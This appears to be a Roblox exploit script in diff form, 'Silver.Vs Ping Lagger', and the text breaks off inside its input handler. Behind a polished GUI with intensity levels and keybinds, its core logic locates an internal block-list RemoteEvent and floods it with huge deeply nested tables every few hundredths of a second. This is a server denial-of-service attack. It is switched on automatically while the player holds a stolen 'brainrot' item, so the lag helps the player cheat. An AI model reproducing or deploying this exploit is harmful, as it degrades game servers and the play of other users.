@@ -1,0 +1,915 @@
+-- Silver.Vs Ping Lagger
+-- PC + Controller keybind | Level System | Auto-save | Auto Brainrot
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService     = game:GetService("TweenService")
+local HttpService      = game:GetService("HttpService")
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService")
+
+local plr              = Players.LocalPlayer
+local plrGui           = plr:WaitForChild("PlayerGui")
+
+-- ══════════════════════════════════════════════════════════════════════
+-- CONFIG & SAVE
+-- ══════════════════════════════════════════════════════════════════════
+local CONFIG_FILE = "SilverVsPingLagger_Config.json"
+
+local LEVELS = {
+    low      = { delay = 0.13, name = "Low" },
+    extreme  = { delay = 0.06, name = "Extreme" },
+    chaos    = { delay = 0.03, name = "Chaos" },
+}
+
+local DEFAULT_CFG = {
+    keybindKb     = "F",
+    keybindGp     = "ButtonR2",
+    currentLevel  = "extreme",
+    autoBrainrot  = true,
+}
+
+local LAG_SETTINGS = {
+    power        = 100000,
+    nestingDepth = 150,
+    maxReps      = 50000,
+}
+
+local cfg = {}
+for k, v in pairs(DEFAULT_CFG) do
+    cfg[k] = v
+end
+
+local function resolveKb(name)
+    if not name or name == "" or name == "None" then return nil end
+    local ok, val = pcall(function() return Enum.KeyCode[name] end)
+    return (ok and val) or nil
+end
+
+local function saveConfig()
+    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+    if ok and encoded and writefile then
+        pcall(writefile, CONFIG_FILE, encoded)
+    end
+end
+
+local function loadConfig()
+    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+    if not ok or type(data) ~= "table" then return end
+
+    cfg.keybindKb    = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
+    cfg.keybindGp    = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
+    cfg.currentLevel = type(data.currentLevel) == "string" and LEVELS[data.currentLevel] and data.currentLevel or DEFAULT_CFG.currentLevel
+    if type(data.autoBrainrot) == "boolean" then
+        cfg.autoBrainrot = data.autoBrainrot
+    end
+end
+
+loadConfig()
+if not LEVELS[cfg.currentLevel] then cfg.currentLevel = DEFAULT_CFG.currentLevel end
+
+local active           = false
+local listeningFor     = nil
+local remote           = nil
+local autoEnabledLag   = false
+local manualOverride   = false
+
+-- ══════════════════════════════════════════════════════════════════════
+-- SILVER / EMPIRE-STYLE PALETTE
+-- ══════════════════════════════════════════════════════════════════════
+local C = {
+    bg        = Color3.fromRGB(14, 14, 18),
+    surface   = Color3.fromRGB(20, 20, 26),
+    card      = Color3.fromRGB(26, 26, 34),
+    chip      = Color3.fromRGB(32, 32, 42),
+    border    = Color3.fromRGB(50, 50, 62),
+    silver    = Color3.fromRGB(196, 196, 208),
+    silverLt  = Color3.fromRGB(232, 232, 240),
+    silverDk  = Color3.fromRGB(120, 120, 132),
+    white     = Color3.fromRGB(250, 250, 252),
+    dim       = Color3.fromRGB(110, 110, 122),
+    green     = Color3.fromRGB(80, 210, 140),
+    red       = Color3.fromRGB(230, 90, 95),
+    orange    = Color3.fromRGB(235, 150, 70),
+    pink      = Color3.fromRGB(230, 120, 175),
+    waiting   = Color3.fromRGB(235, 195, 70),
+    inputBg   = Color3.fromRGB(16, 16, 22),
+    hover     = Color3.fromRGB(42, 42, 54),
+}
+
+local levelColors = {
+    low     = C.green,
+    extreme = C.orange,
+    chaos   = C.pink,
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- DESTROY OLD GUI
+-- ══════════════════════════════════════════════════════════════════════
+for _, kid in pairs(plrGui:GetChildren()) do
+    if kid.Name == "PrivatesPingLaggerGui" or kid.Name == "SilverVsPingLaggerGui" then
+        kid:Destroy()
+    end
+end
+
+local screen = Instance.new("ScreenGui")
+screen.Name         = "SilverVsPingLaggerGui"
+screen.ResetOnSpawn = false
+screen.DisplayOrder = 15
+screen.IgnoreGuiInset = true
+screen.Parent       = plrGui
+
+-- ══════════════════════════════════════════════════════════════════════
+-- HELPERS
+-- ══════════════════════════════════════════════════════════════════════
+local function tw(obj, props, t, easing)
+    TweenService:Create(obj,
+        TweenInfo.new(t or 0.18, easing or Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+        props):Play()
+end
+
+local function addGradient(obj, c1, c2, rot)
+    local g = Instance.new("UIGradient", obj)
+    g.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, c1),
+        ColorSequenceKeypoint.new(1, c2)
+    })
+    g.Rotation = rot or 135
+    return g
+end
+
+local function corner(obj, r)
+    local c = Instance.new("UICorner", obj)
+    c.CornerRadius = UDim.new(0, r or 10)
+    return c
+end
+
+local function stroke(obj, col, thick, transp)
+    local s = Instance.new("UIStroke", obj)
+    s.Color = col or C.border
+    s.Thickness = thick or 1
+    s.Transparency = transp or 0.4
+    s.LineJoinMode = Enum.LineJoinMode.Round
+    return s
+end
+
+local function makeDraggable(frame)
+    local dragToggle, dragStart, startPos
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragToggle = true
+            dragStart = input.Position
+            startPos = frame.Position
+        end
+    end)
+    frame.InputChanged:Connect(function(input)
+        if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragToggle = false
+        end
+    end)
+end
+
+local function isGamepad(kc)
+    local n = kc.Name
+    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
+        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
+end
+
+local BLACKLISTED = {
+    [Enum.KeyCode.Escape]      = true,
+    [Enum.KeyCode.LeftControl] = true,
+    [Enum.KeyCode.Unknown]     = true,
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- AUTO BRAINROT DETECTION
+-- ══════════════════════════════════════════════════════════════════════
+local BAT_NAMES = {
+    bat = true, slap = true, ["iron slap"] = true, ["gold slap"] = true,
+    ["diamond slap"] = true, ["emerald slap"] = true, ["ruby slap"] = true,
+    ["dark matter slap"] = true, ["flame slap"] = true, ["nuclear slap"] = true,
+    ["galaxy slap"] = true, ["glitched slap"] = true,
+}
+
+local function isBatName(n)
+    n = string.lower(tostring(n or ""))
+    if BAT_NAMES[n] then return true end
+    if n:find("bat", 1, true) or n:find("slap", 1, true) then return true end
+    return false
+end
+
+local function hasBrainrot()
+    if plr:GetAttribute("Stealing") == true then return true end
+    if plr:GetAttribute("HasBrainrot") == true then return true end
+    if plr:GetAttribute("Carrying") == true then return true end
+    if plr:GetAttribute("HoldingBrainrot") == true then return true end
+
+    local char = plr.Character
+    if not char then return false end
+
+    if char:GetAttribute("Stealing") == true then return true end
+    if char:GetAttribute("HasBrainrot") == true then return true end
+    if char:GetAttribute("Carrying") == true then return true end
+
+    for _, t in ipairs(char:GetChildren()) do
+        if t:IsA("Tool") and not isBatName(t.Name) then
+            return true
+        end
+    end
+
+    for _, t in ipairs(char:GetChildren()) do
+        if (t:IsA("Model") or t:IsA("Folder") or t:IsA("BasePart")) and not isBatName(t.Name) then
+            local n = string.lower(t.Name)
+            if n:find("brain", 1, true)
+                or n:find("rot", 1, true)
+                or n:find("animal", 1, true)
+                or n:find("pet", 1, true)
+                or n:find("steal", 1, true)
+                or n:find("carry", 1, true)
+                or n:find("mem", 1, true) then
+                return true
+            end
+        end
+    end
+
+    for _, d in ipairs(char:GetDescendants()) do
+        if d:IsA("Model") or d:IsA("Tool") then
+            local n = string.lower(d.Name)
+            if n:find("brainrot", 1, true) or n:find("brain rot", 1, true) then
+                return true
+            end
+        end
+    end
+
+    return false
+end
+
+-- ══════════════════════════════════════════════════════════════════════
+-- MAIN FRAME — Empire-lagger style (compact pill panel)
+-- ══════════════════════════════════════════════════════════════════════
+local MAIN_W, MAIN_H = 280, 318
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name             = "MainFrame"
+mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
+mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
+mainFrame.BackgroundColor3 = C.bg
+mainFrame.BorderSizePixel  = 0
+mainFrame.Active           = true
+mainFrame.ClipsDescendants = true
+mainFrame.Parent           = screen
+corner(mainFrame, 16)
+local outerStroke = stroke(mainFrame, C.silver, 1.4, 0.5)
+addGradient(mainFrame, Color3.fromRGB(20, 20, 26), Color3.fromRGB(10, 10, 14), 155)
+makeDraggable(mainFrame)
+
+-- silver bg layers
+local bgSilver = Instance.new("ImageLabel", mainFrame)
+bgSilver.Size = UDim2.new(1, 0, 1, 0)
+bgSilver.BackgroundTransparency = 1
+bgSilver.Image = "rbxassetid://131770731727598"
+bgSilver.ImageColor3 = Color3.fromRGB(175, 180, 195)
+bgSilver.ImageTransparency = 0.84
+bgSilver.ScaleType = Enum.ScaleType.Crop
+bgSilver.ZIndex = 0
+corner(bgSilver, 16)
+
+local bgSheen = Instance.new("Frame", mainFrame)
+bgSheen.Size = UDim2.new(1, 0, 1, 0)
+bgSheen.BackgroundColor3 = Color3.fromRGB(200, 200, 210)
+bgSheen.BackgroundTransparency = 0.95
+bgSheen.BorderSizePixel = 0
+bgSheen.ZIndex = 0
+corner(bgSheen, 16)
+local sheenGrad = Instance.new("UIGradient", bgSheen)
+sheenGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(150, 155, 170)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 40)),
+})
+sheenGrad.Rotation = 120
+
+-- ══════════════════════════════════════════════════════════════════════
+-- HEADER (Empire-style top bar)
+-- ══════════════════════════════════════════════════════════════════════
+local header = Instance.new("Frame", mainFrame)
+header.Size = UDim2.new(1, 0, 0, 44)
+header.BackgroundColor3 = C.surface
+header.BackgroundTransparency = 0.25
+header.BorderSizePixel = 0
+header.ZIndex = 2
+corner(header, 16)
+
+-- square off bottom of header corners
+local headerFill = Instance.new("Frame", mainFrame)
+headerFill.Size = UDim2.new(1, 0, 0, 16)
+headerFill.Position = UDim2.new(0, 0, 0, 28)
+headerFill.BackgroundColor3 = C.surface
+headerFill.BackgroundTransparency = 0.25
+headerFill.BorderSizePixel = 0
+headerFill.ZIndex = 1
+
+local logo = Instance.new("Frame", header)
+logo.Size = UDim2.new(0, 28, 0, 28)
+logo.Position = UDim2.new(0, 12, 0.5, -14)
+logo.BackgroundColor3 = C.chip
+logo.BorderSizePixel = 0
+logo.ZIndex = 3
+corner(logo, 9)
+stroke(logo, C.silver, 1.1, 0.4)
+
+local logoTxt = Instance.new("TextLabel", logo)
+logoTxt.Size = UDim2.new(1, 0, 1, 0)
+logoTxt.BackgroundTransparency = 1
+logoTxt.Text = "SV"
+logoTxt.TextColor3 = C.silverLt
+logoTxt.Font = Enum.Font.GothamBlack
+logoTxt.TextSize = 11
+logoTxt.ZIndex = 4
+
+local titleLbl = Instance.new("TextLabel", header)
+titleLbl.Size = UDim2.new(1, -100, 0, 16)
+titleLbl.Position = UDim2.new(0, 48, 0, 8)
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text = "SILVER.VS"
+titleLbl.TextColor3 = C.silverLt
+titleLbl.Font = Enum.Font.GothamBlack
+titleLbl.TextSize = 13
+titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+titleLbl.ZIndex = 3
+
+local subLbl = Instance.new("TextLabel", header)
+subLbl.Size = UDim2.new(1, -100, 0, 12)
+subLbl.Position = UDim2.new(0, 48, 0, 24)
+subLbl.BackgroundTransparency = 1
+subLbl.Text = "PING LAGGER"
+subLbl.TextColor3 = C.dim
+subLbl.Font = Enum.Font.GothamBold
+subLbl.TextSize = 9
+subLbl.TextXAlignment = Enum.TextXAlignment.Left
+subLbl.ZIndex = 3
+
+local statusPill = Instance.new("Frame", header)
+statusPill.Size = UDim2.new(0, 50, 0, 22)
+statusPill.Position = UDim2.new(1, -58, 0.5, -11)
+statusPill.BackgroundColor3 = Color3.fromRGB(40, 18, 20)
+statusPill.BorderSizePixel = 0
+statusPill.ZIndex = 3
+corner(statusPill, 11)
+local pillBorder = stroke(statusPill, C.red, 1, 0.3)
+
+local statusDot = Instance.new("Frame", statusPill)
+statusDot.Size = UDim2.new(0, 6, 0, 6)
+statusDot.Position = UDim2.new(0, 8, 0.5, -3)
+statusDot.BackgroundColor3 = C.red
+statusDot.BorderSizePixel = 0
+statusDot.ZIndex = 4
+corner(statusDot, 99)
+
+local statusLbl = Instance.new("TextLabel", statusPill)
+statusLbl.Size = UDim2.new(0, 28, 1, 0)
+statusLbl.Position = UDim2.new(0, 18, 0, 0)
+statusLbl.BackgroundTransparency = 1
+statusLbl.Text = "OFF"
+statusLbl.TextColor3 = C.red
+statusLbl.Font = Enum.Font.GothamBlack
+statusLbl.TextSize = 9
+statusLbl.ZIndex = 4
+
+-- ══════════════════════════════════════════════════════════════════════
+-- MODE CHIPS (Empire-style horizontal pills — only 3)
+-- ══════════════════════════════════════════════════════════════════════
+local modeRow = Instance.new("Frame", mainFrame)
+modeRow.Size = UDim2.new(1, -24, 0, 36)
+modeRow.Position = UDim2.new(0, 12, 0, 54)
+modeRow.BackgroundColor3 = C.chip
+modeRow.BackgroundTransparency = 0.15
+modeRow.BorderSizePixel = 0
+modeRow.ZIndex = 2
+corner(modeRow, 12)
+stroke(modeRow, C.border, 1, 0.45)
+
+local levelOrder = {"low", "extreme", "chaos"}
+local levelBtns = {}
+
+local function updateLevelDisplay()
+    for lvl, btn in pairs(levelBtns) do
+        local col = levelColors[lvl]
+        if lvl == cfg.currentLevel then
+            tw(btn.bg, {BackgroundColor3 = col, BackgroundTransparency = 0.78}, 0.18)
+            tw(btn.stroke, {Color = col, Transparency = 0.05}, 0.18)
+            tw(btn.label, {TextColor3 = col}, 0.18)
+            btn.label.Font = Enum.Font.GothamBlack
+        else
+            tw(btn.bg, {BackgroundColor3 = C.card, BackgroundTransparency = 1}, 0.18)
+            tw(btn.stroke, {Color = C.border, Transparency = 1}, 0.18)
+            tw(btn.label, {TextColor3 = C.dim}, 0.18)
+            btn.label.Font = Enum.Font.GothamBold
+        end
+    end
+end
+
+for i, lvl in ipairs(levelOrder) do
+    local w = (280 - 24 - 12) / 3 -- three equal chips inside padding
+    local btn = Instance.new("TextButton", modeRow)
+    btn.Size = UDim2.new(0, w, 1, -6)
+    btn.Position = UDim2.new(0, 3 + (i - 1) * (w + 3), 0, 3)
+    btn.BackgroundColor3 = C.card
+    btn.BackgroundTransparency = 1
+    btn.BorderSizePixel = 0
+    btn.AutoButtonColor = false
+    btn.Text = ""
+    btn.ZIndex = 3
+    corner(btn, 9)
+    local st = stroke(btn, C.border, 1, 1)
+
+    local lbl = Instance.new("TextLabel", btn)
+    lbl.Size = UDim2.new(1, 0, 1, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = LEVELS[lvl].name:upper()
+    lbl.TextColor3 = C.dim
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 11
+    lbl.ZIndex = 4
+
+    levelBtns[lvl] = { bg = btn, stroke = st, label = lbl }
+
+    btn.MouseEnter:Connect(function()
+        if lvl ~= cfg.currentLevel then
+            tw(lbl, {TextColor3 = C.silverLt}, 0.12)
+        end
+    end)
+    btn.MouseLeave:Connect(function()
+        if lvl ~= cfg.currentLevel then
+            tw(lbl, {TextColor3 = C.dim}, 0.12)
+        end
+    end)
+    btn.MouseButton1Click:Connect(function()
+        if cfg.currentLevel ~= lvl then
+            cfg.currentLevel = lvl
+            updateLevelDisplay()
+            saveConfig()
+        end
+    end)
+end
+
+-- ══════════════════════════════════════════════════════════════════════
+-- KEYBINDS (compact Empire rows)
+-- ══════════════════════════════════════════════════════════════════════
+local kbCard = Instance.new("Frame", mainFrame)
+kbCard.Size = UDim2.new(1, -24, 0, 78)
+kbCard.Position = UDim2.new(0, 12, 0, 98)
+kbCard.BackgroundColor3 = C.surface
+kbCard.BackgroundTransparency = 0.2
+kbCard.BorderSizePixel = 0
+kbCard.ZIndex = 2
+corner(kbCard, 12)
+stroke(kbCard, C.border, 1, 0.45)
+
+local kbTitle = Instance.new("TextLabel", kbCard)
+kbTitle.Size = UDim2.new(1, -16, 0, 14)
+kbTitle.Position = UDim2.new(0, 10, 0, 6)
+kbTitle.BackgroundTransparency = 1
+kbTitle.Text = "KEYBINDS"
+kbTitle.TextColor3 = C.silverDk
+kbTitle.Font = Enum.Font.GothamBlack
+kbTitle.TextSize = 8
+kbTitle.TextXAlignment = Enum.TextXAlignment.Left
+kbTitle.ZIndex = 3
+
+local kbBindBtn, gpBindBtn
+
+local function updateKbLabels()
+    if kbBindBtn then
+        if listeningFor == "kb" then
+            kbBindBtn.label.Text = "..."
+            tw(kbBindBtn.bg, {BackgroundColor3 = Color3.fromRGB(50, 42, 18)}, 0.15)
+            tw(kbBindBtn.stroke, {Color = C.waiting, Transparency = 0}, 0.15)
+        else
+            kbBindBtn.label.Text = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
+            tw(kbBindBtn.bg, {BackgroundColor3 = C.inputBg}, 0.15)
+            tw(kbBindBtn.stroke, {Color = C.border, Transparency = 0.4}, 0.15)
+        end
+    end
+    if gpBindBtn then
+        if listeningFor == "gp" then
+            gpBindBtn.label.Text = "..."
+            tw(gpBindBtn.bg, {BackgroundColor3 = Color3.fromRGB(50, 42, 18)}, 0.15)
+            tw(gpBindBtn.stroke, {Color = C.waiting, Transparency = 0}, 0.15)
+        else
+            gpBindBtn.label.Text = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
+            tw(gpBindBtn.bg, {BackgroundColor3 = C.inputBg}, 0.15)
+            tw(gpBindBtn.stroke, {Color = C.border, Transparency = 0.4}, 0.15)
+        end
+    end
+end
+
+local function mkBindRow(y, name, which)
+    local rowLbl = Instance.new("TextLabel", kbCard)
+    rowLbl.Size = UDim2.new(0, 72, 0, 24)
+    rowLbl.Position = UDim2.new(0, 12, 0, y)
+    rowLbl.BackgroundTransparency = 1
+    rowLbl.Text = name
+    rowLbl.TextColor3 = C.dim
+    rowLbl.Font = Enum.Font.GothamBold
+    rowLbl.TextSize = 11
+    rowLbl.TextXAlignment = Enum.TextXAlignment.Left
+    rowLbl.ZIndex = 3
+
+    local bind = Instance.new("TextButton", kbCard)
+    bind.Size = UDim2.new(0, 100, 0, 24)
+    bind.Position = UDim2.new(1, -140, 0, y)
+    bind.BackgroundColor3 = C.inputBg
+    bind.BorderSizePixel = 0
+    bind.AutoButtonColor = false
+    bind.Text = ""
+    bind.ZIndex = 3
+    corner(bind, 8)
+    local st = stroke(bind, C.border, 1, 0.4)
+
+    local txt = Instance.new("TextLabel", bind)
+    txt.Size = UDim2.new(1, 0, 1, 0)
+    txt.BackgroundTransparency = 1
+    txt.Text = which == "kb" and cfg.keybindKb or cfg.keybindGp
+    txt.TextColor3 = C.silverLt
+    txt.Font = Enum.Font.GothamBold
+    txt.TextSize = 11
+    txt.ZIndex = 4
+
+    local data = { bg = bind, stroke = st, label = txt }
+
+    bind.MouseEnter:Connect(function()
+        if listeningFor ~= which then tw(bind, {BackgroundColor3 = C.hover}, 0.12) end
+    end)
+    bind.MouseLeave:Connect(function()
+        if listeningFor ~= which then tw(bind, {BackgroundColor3 = C.inputBg}, 0.12) end
+    end)
+    bind.MouseButton1Click:Connect(function()
+        listeningFor = (listeningFor == which) and nil or which
+        updateKbLabels()
+    end)
+
+    local clear = Instance.new("TextButton", kbCard)
+    clear.Size = UDim2.new(0, 24, 0, 24)
+    clear.Position = UDim2.new(1, -32, 0, y)
+    clear.BackgroundColor3 = Color3.fromRGB(42, 18, 20)
+    clear.BorderSizePixel = 0
+    clear.AutoButtonColor = false
+    clear.Text = "x"
+    clear.TextColor3 = C.red
+    clear.Font = Enum.Font.GothamBlack
+    clear.TextSize = 11
+    clear.ZIndex = 3
+    corner(clear, 8)
+    stroke(clear, C.red, 1, 0.45)
+
+    clear.MouseButton1Click:Connect(function()
+        if listeningFor == which then listeningFor = nil end
+        if which == "kb" then cfg.keybindKb = "None" else cfg.keybindGp = "None" end
+        updateKbLabels()
+        saveConfig()
+    end)
+
+    if which == "kb" then kbBindBtn = data else gpBindBtn = data end
+end
+
+mkBindRow(26, "Keyboard", "kb")
+mkBindRow(50, "Controller", "gp")
+
+-- ══════════════════════════════════════════════════════════════════════
+-- AUTO BRAINROT (pill toggle row)
+-- ══════════════════════════════════════════════════════════════════════
+local autoCard = Instance.new("Frame", mainFrame)
+autoCard.Size = UDim2.new(1, -24, 0, 40)
+autoCard.Position = UDim2.new(0, 12, 0, 184)
+autoCard.BackgroundColor3 = C.surface
+autoCard.BackgroundTransparency = 0.2
+autoCard.BorderSizePixel = 0
+autoCard.ZIndex = 2
+corner(autoCard, 12)
+local autoBorder = stroke(autoCard, C.border, 1, 0.45)
+
+local autoLbl = Instance.new("TextLabel", autoCard)
+autoLbl.Size = UDim2.new(1, -70, 0, 16)
+autoLbl.Position = UDim2.new(0, 12, 0, 5)
+autoLbl.BackgroundTransparency = 1
+autoLbl.Text = "AUTO BRAINROT"
+autoLbl.TextColor3 = C.silverLt
+autoLbl.Font = Enum.Font.GothamBlack
+autoLbl.TextSize = 11
+autoLbl.TextXAlignment = Enum.TextXAlignment.Left
+autoLbl.ZIndex = 3
+
+local autoSub = Instance.new("TextLabel", autoCard)
+autoSub.Size = UDim2.new(1, -70, 0, 12)
+autoSub.Position = UDim2.new(0, 12, 0, 22)
+autoSub.BackgroundTransparency = 1
+autoSub.Text = "on while holding brainrot"
+autoSub.TextColor3 = C.dim
+autoSub.Font = Enum.Font.Gotham
+autoSub.TextSize = 8
+autoSub.TextXAlignment = Enum.TextXAlignment.Left
+autoSub.ZIndex = 3
+
+local toggleTrack = Instance.new("TextButton", autoCard)
+toggleTrack.Size = UDim2.new(0, 42, 0, 22)
+toggleTrack.Position = UDim2.new(1, -52, 0.5, -11)
+toggleTrack.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(42, 42, 52)
+toggleTrack.BorderSizePixel = 0
+toggleTrack.AutoButtonColor = false
+toggleTrack.Text = ""
+toggleTrack.ZIndex = 3
+corner(toggleTrack, 11)
+
+local toggleKnob = Instance.new("Frame", toggleTrack)
+toggleKnob.Size = UDim2.new(0, 16, 0, 16)
+toggleKnob.Position = cfg.autoBrainrot and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
+toggleKnob.BackgroundColor3 = C.white
+toggleKnob.BorderSizePixel = 0
+toggleKnob.ZIndex = 4
+corner(toggleKnob, 99)
+
+local function updateAutoVisual()
+    if cfg.autoBrainrot then
+        tw(toggleTrack, {BackgroundColor3 = C.green}, 0.16)
+        tw(toggleKnob, {Position = UDim2.new(1, -19, 0.5, -8)}, 0.16)
+        tw(autoBorder, {Color = C.green, Transparency = 0.28}, 0.16)
+    else
+        tw(toggleTrack, {BackgroundColor3 = Color3.fromRGB(42, 42, 52)}, 0.16)
+        tw(toggleKnob, {Position = UDim2.new(0, 3, 0.5, -8)}, 0.16)
+        tw(autoBorder, {Color = C.border, Transparency = 0.45}, 0.16)
+    end
+end
+
+-- ══════════════════════════════════════════════════════════════════════
+-- ACTIVATE (full-width Empire-style button)
+-- ══════════════════════════════════════════════════════════════════════
+local activateBtn = Instance.new("TextButton", mainFrame)
+activateBtn.Size = UDim2.new(1, -24, 0, 42)
+activateBtn.Position = UDim2.new(0, 12, 0, 234)
+activateBtn.BackgroundColor3 = C.card
+activateBtn.BorderSizePixel = 0
+activateBtn.AutoButtonColor = false
+activateBtn.Text = ""
+activateBtn.ZIndex = 3
+corner(activateBtn, 12)
+local activateGrad = addGradient(activateBtn, C.silver, C.silverDk, 120)
+local activateGlow = stroke(activateBtn, C.silver, 1.4, 0.35)
+
+local activateLbl = Instance.new("TextLabel", activateBtn)
+activateLbl.Size = UDim2.new(1, 0, 1, 0)
+activateLbl.BackgroundTransparency = 1
+activateLbl.Text = "ACTIVATE"
+activateLbl.TextColor3 = C.bg
+activateLbl.Font = Enum.Font.GothamBlack
+activateLbl.TextSize = 14
+activateLbl.ZIndex = 4
+
+local foot = Instance.new("TextLabel", mainFrame)
+foot.Size = UDim2.new(1, 0, 0, 14)
+foot.Position = UDim2.new(0, 0, 1, -22)
+foot.BackgroundTransparency = 1
+foot.Text = "silver.vs"
+foot.TextColor3 = C.dim
+foot.Font = Enum.Font.GothamBold
+foot.TextSize = 9
+foot.ZIndex = 3
+
+-- ══════════════════════════════════════════════════════════════════════
+-- PING LAGGER LOGIC (untouched)
+-- ══════════════════════════════════════════════════════════════════════
+local function findRemote()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
+        local r = rrs:FindFirstChild(name)
+        if r and r:IsA("RemoteEvent") then return r end
+    end
+    for _, c in ipairs(rrs:GetChildren()) do
+        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
+    end
+end
+
+remote = findRemote()
+
+local function buildPayload()
+    local main = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, LAG_SETTINGS.nestingDepth do
+        local n = {}
+        table.insert(current, n)
+        current = n
+    end
+    local maxRep = math.min(math.floor(LAG_SETTINGS.power / (LAG_SETTINGS.nestingDepth + 2)), LAG_SETTINGS.maxReps)
+    for _ = 1, maxRep do
+        table.insert(main, nested)
+    end
+    return main
+end
+
+local function runPingLoop()
+    while active and remote do
+        local delay = LEVELS[cfg.currentLevel].delay
+        local payload = buildPayload()
+        pcall(function() remote:FireServer(payload) end)
+        task.wait(delay)
+    end
+end
+
+local function setActiveVisual(on)
+    if on then
+        pcall(function() activateGrad:Destroy() end)
+        activateGrad = addGradient(activateBtn, C.green, Color3.fromRGB(40, 160, 100), 120)
+        activateLbl.Text = "ACTIVATED"
+        activateLbl.TextColor3 = C.white
+        tw(activateGlow, {Color = C.green, Transparency = 0.12}, 0.22)
+        tw(outerStroke, {Color = C.green, Transparency = 0.22}, 0.22)
+        tw(statusPill, {BackgroundColor3 = Color3.fromRGB(14, 36, 24)}, 0.22)
+        tw(pillBorder, {Color = C.green, Transparency = 0.15}, 0.22)
+        tw(statusDot, {BackgroundColor3 = C.green}, 0.22)
+        statusLbl.Text = "ON"
+        tw(statusLbl, {TextColor3 = C.green}, 0.22)
+    else
+        pcall(function() activateGrad:Destroy() end)
+        activateGrad = addGradient(activateBtn, C.silver, C.silverDk, 120)
+        activateLbl.Text = "ACTIVATE"
+        activateLbl.TextColor3 = C.bg
+        tw(activateGlow, {Color = C.silver, Transparency = 0.35}, 0.22)
+        tw(outerStroke, {Color = C.silver, Transparency = 0.5}, 0.22)
+        tw(statusPill, {BackgroundColor3 = Color3.fromRGB(40, 18, 20)}, 0.22)
+        tw(pillBorder, {Color = C.red, Transparency = 0.3}, 0.22)
+        tw(statusDot, {BackgroundColor3 = C.red}, 0.22)
+        statusLbl.Text = "OFF"
+        tw(statusLbl, {TextColor3 = C.red}, 0.22)
+    end
+end
+
+local function flipLag(state, fromAuto)
+    if state == active then return end
+    active = state
+
+    if active then
+        if not remote then
+            remote = findRemote()
+            if not remote then
+                active = false
+                setActiveVisual(false)
+                return
+            end
+        end
+        setActiveVisual(true)
+        if fromAuto then
+            autoEnabledLag = true
+        end
+        task.spawn(runPingLoop)
+    else
+        setActiveVisual(false)
+        autoEnabledLag = false
+    end
+end
+
+activateBtn.MouseButton1Click:Connect(function()
+    local wasOn = active
+    flipLag(not active, false)
+    if wasOn and not active then
+        manualOverride = true
+        autoEnabledLag = false
+    elseif active then
+        manualOverride = false
+        autoEnabledLag = false
+    end
+end)
+
+activateBtn.MouseEnter:Connect(function()
+    if not active then tw(activateGlow, {Transparency = 0.15}, 0.12) end
+end)
+activateBtn.MouseLeave:Connect(function()
+    if not active then tw(activateGlow, {Transparency = 0.35}, 0.12) end
+end)
+
+toggleTrack.MouseButton1Click:Connect(function()
+    cfg.autoBrainrot = not cfg.autoBrainrot
+    updateAutoVisual()
+    saveConfig()
+    if not cfg.autoBrainrot and autoEnabledLag then
+        flipLag(false, false)
+        manualOverride = false
+    end
+end)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- AUTO BRAINROT LOOP
+-- ══════════════════════════════════════════════════════════════════════
+task.spawn(function()
+    local lastState = false
+    while true do
+        task.wait(0.15)
+        if cfg.autoBrainrot then
+            local holding = false
+            pcall(function() holding = hasBrainrot() end)
+
+            if holding then
+                if not active and not manualOverride then
+                    flipLag(true, true)
+                end
+                if holding and not lastState then
+                    manualOverride = false
+                    if not active then
+                        flipLag(true, true)
+                    end
+                end
+            else
+                if autoEnabledLag and active then
+                    flipLag(false, false)
+                end
+                manualOverride = false
+            end
+            lastState = holding
+        else
+            lastState = false
+        end
+    end
+end)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- INPUT HANDLER
+-- ══════════════════════════════════════════════════════════════════════
+UserInputService.InputBegan:Connect(function(input, processed)
+    local kc = input.KeyCode
+    if kc == Enum.KeyCode.Unknown then return end
+    local isGp = isGamepad(kc)
+    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
+
+    if listeningFor then
